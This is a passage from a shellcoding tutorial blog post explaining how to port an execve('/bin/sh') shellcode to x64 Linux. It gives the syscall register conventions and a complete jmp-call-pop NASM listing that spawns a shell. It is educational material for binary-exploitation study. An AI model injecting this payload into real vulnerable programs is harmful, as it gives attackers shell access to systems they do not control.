<p><img data-src="/assets/img/Pasted image 20240415193413.png" alt="" data-proofer-ignore></p>

<p>We can also port this shellcode for x64 (64-bit) systems. All we need to do is update the name of the registers, and use the x64 syscall for <code class="language-plaintext highlighter-rouge">execve()</code>.</p>

<p>Under x64, the <code class="language-plaintext highlighter-rouge">syscall</code> instruction is used for making system calls, with the syscall code stored in <code class="language-plaintext highlighter-rouge">RAX</code>. Arguments are passed in registers, staring with <code class="language-plaintext highlighter-rouge">RDI</code>, then <code class="language-plaintext highlighter-rouge">RSI</code>, <code class="language-plaintext highlighter-rouge">RDX</code>, and the rest. To make an <code class="language-plaintext highlighter-rouge">execve()</code> syscall under x64;</p>

<ol>
  <li>Set <code class="language-plaintext highlighter-rouge">RAX</code> to <code class="language-plaintext highlighter-rouge">0x3b</code></li>
  <li>Set <code class="language-plaintext highlighter-rouge">RDI</code> to the full path of the program to execute (<code class="language-plaintext highlighter-rouge">/bin/sh</code>)</li>
  <li>Set <code class="language-plaintext highlighter-rouge">RSI</code> to the <code class="language-plaintext highlighter-rouge">argv[]</code> array.</li>
  <li>Set <code class="language-plaintext highlighter-rouge">RDX</code> to the <code class="language-plaintext highlighter-rouge">envp[]</code> array. Can be null.</li>
  <li>Call <code class="language-plaintext highlighter-rouge">syscall</code></li>
</ol>

<p>The modified shellcode for x64;</p>

<div class="language-nasm highlighter-rouge"><div class="code-header"><span label-text="Nasm"><i class="fas fa-code small"></i></span><button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre><span class="nf">section</span> <span class="nv">.text</span>
    <span class="nf">global</span> <span class="nv">_start</span>

<span class="nl">_start:</span>
    <span class="nf">jmp</span> <span class="nv">loc1</span>

<span class="nl">shellcode:</span>
    <span class="nf">pop</span> <span class="nb">rbx</span>
    <span class="nf">xor</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rax</span>            <span class="c1">; For nulling.</span>
    <span class="nf">push</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rbx</span><span class="p">]</span>        <span class="c1">; RSP = '/bin/shA'</span>
    <span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mi">7</span><span class="p">],</span> <span class="nb">al</span>  <span class="c1">; Null-terminate.</span>
    <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span>            <span class="c1">; rdi = '/bin/sh'</span>
    
    <span class="c1">; Setup argv[]</span>
    <span class="nf">push</span> <span class="nb">rax</span>
    <span class="nf">push</span> <span class="nb">rdi</span>
    <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="nb">rsp</span>            <span class="c1">; rsi = {"/bin/sh", NULL}</span>

    <span class="c1">; Setup envp[]</span>
    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rax</span>            <span class="c1">; rdx = NULL</span>

    <span class="c1">; Make the syscall</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0x3b</span>            <span class="c1">; 0x3b = execve() syscall code</span>
    <span class="nf">syscall</span>

<span class="nl">loc1:</span>
    <span class="nf">call</span> <span class="nv">shellcode</span>
    <span class="kd">db</span> <span class="err">"</span><span class="o">/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">shA</span><span class="err">"</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Same steps discussed above can be used to extract and test the shellcode :)</p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories --><div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i><a href='/categories/shellcoding/'>shellcoding</a></div><!-- tags --><div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i><a href="/tags/shellcoding/"
          class="post-tag no-text-decoration" >shellcoding</a><a href="/tags/shellcode/"
          class="post-tag no-text-decoration" >shellcode</a><a href="/tags/binary-exploitation/"
          class="post-tag no-text-decoration" >binary exploitation</a><a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a><a href="/tags/x86/"
          class="post-tag no-text-decoration" >x86</a><a href="/tags/x64/"
          class="post-tag no-text-decoration" >x64</a><a href="/tags/assembly/"
          class="post-tag no-text-decoration" >assembly</a><a href="/tags/asm/"
          class="post-tag no-text-decoration" >asm</a><a href="/tags/nasm/"
          class="post-tag no-text-decoration" >nasm</a><a href="/tags/objdump/"
          class="post-tag no-text-decoration" >objdump</a><a href="/tags/objcopy/"
          class="post-tag no-text-decoration" >objcopy</a><a href="/tags/radare2/"
          class="post-tag no-text-decoration" >radare2</a><a href="/tags/rasm2/"
          class="post-tag no-text-decoration" >rasm2</a></div><div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a> by the author.</div><!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons"><a href="https://twitter.com/intent/tweet?text=Injectable Shellcodes: The ADDRESS Challenge - 4g3nt47&url=https://4g3nt47.github.io/posts/shellcoding/shellcoding_addr_chall.html" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a><a href="https://www.facebook.com/sharer/sharer.php?title=Injectable Shellcodes: The ADDRESS Challenge - 4g3nt47&u=https://4g3nt47.github.io/posts/shellcoding/shellcoding_addr_chall.html" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a><a href="https://telegram.me/share?text=Injectable Shellcodes: The ADDRESS Challenge - 4g3nt47&url=https://4g3nt47.github.io/posts/shellcoding/shellcoding_addr_chall.html" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a><i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        title-succeed="Link copied successfully!">
    </i>

  </span>
</div>
</div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

</div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

    <div class="access"><!--<div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/lfi/">lfi</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/easy/">easy</a></div>
  </div>-->
    </div><!-- BS-toc.js will be loaded at medium priority -->
<script src="/assets/js/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div></div>

</div>

<!-- tail --><div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  --><!-- An random integer that bigger than 0  --><!-- Equals to TAG_SCORE / {max_categories_hierarchy}  --><!-- Fill with the other newlest posts  --><div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4"><div class="card">
        <a href="/posts/hackthebox/overflow.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2022-04-09 00:00:00 +0100">Apr  9, 2022</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Overflow - HackTheBox</h3>
            <div class="text-muted small">
              <p>Overflow is an amazing hard-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an oracle padding vulnerability to gain access to an admin dashboard that’s vulnerable t...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/gofer.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2023-10-22 00:00:00 +0100">Oct 22, 2023</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Gofer - HackTheBox</h3>
            <div class="text-muted small">
              <p>Gofer is a very nice, hard box on HackTheBox. It starts with a verb tampering attack on a custom proxy to bypass access control, then a phishing attack on a local user using LibreOffice macro. Priv...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/pandora.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2022-05-21 00:00:00 +0100">May 21, 2022</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Pandora - HackTheBox</h3>
            <div class="text-muted small">
              <p>Pandora is an easy linux box. It starts with a website, which you don’t really need because foothold involves enumerating an SNMP service on port 161 (UDP) for running processes, which will give yo...
              </p>
            </div>
          </div>
        </a>
      </div></div> <!-- .card-deck -->
  </div> <!-- #related-posts --><!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between"><a href="/posts/binary%20exploitation/format_strings_intro.html" class="btn btn-outline-primary"
    prompt="Older">
    <p>Introduction to Format Strings Vulnerabilities</p>
  </a><span class="btn btn-outline-primary disabled"
    prompt="Newer">
    <p>-</p>
  </span></div>
<!--  The comments switcher --></div>
  </div>
</div> <!-- .row --><!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2024
        <a href="https://twitter.com/UmarAbdoul">Umar Abdul</a>.<span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p>
    </div>

    <div class="footer-right">
      <p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>
</div><!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints"><div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/lfi/">lfi</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/easy/">easy</a></div>
  </div></div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>
</div> <!-- #main-wrapper --><div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a><!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
--><script src="/assets/js/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>
<!--
  JS selector for site.
-->

<!-- layout specified --><!-- image lazy-loading & popup -->
  <script src="/assets/js/clipboard.min.js"></script><script defer src="/assets/js/dist/post.min.js"></script><!-- commons -->

<script src="/assets/js/bootstrap.min.js"></script></body>

</html>
